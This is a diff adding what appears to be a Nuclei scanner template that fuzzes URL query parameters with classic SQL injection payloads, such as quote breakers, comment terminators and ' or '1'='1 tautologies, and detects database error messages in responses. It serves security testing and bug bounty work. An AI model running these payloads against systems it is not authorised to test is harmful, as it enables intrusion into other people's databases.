@@ -1,0 +1,45 @@
+id: bugbounty-sqli
+
+info:
+  name: SQL Injection via Params
+  author: Justin Washek
+  severity: high
+  description: |
+    Fuzzes query param values with SQLi payloads and detects error-based injection via response content.
+  tags: sqli,fuzzing,injection,bugbounty
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "'"
+          - "\""
+          - "`"
+          - "'--"
+          - "\"--"
+          - "'#"
+          - "\"#"
+          - "')--"
+          - "\"))"
+          - "' or '1'='1"
+          - "\" or \"1\"=\"1"
+          - "1') or ('1'='1"
+          - "1\")) or (\"1\"=\"1"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(sql syntax|mysql_fetch|syntax error|unterminated|SQLSTATE|ODBC|JDBC|You have an error in your SQL syntax)"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(SQL syntax.*?near .*? at line \\d+)"
+          - "(?i)(SQLSTATE\\[[0-9A-Z]+\\]: .*?)"
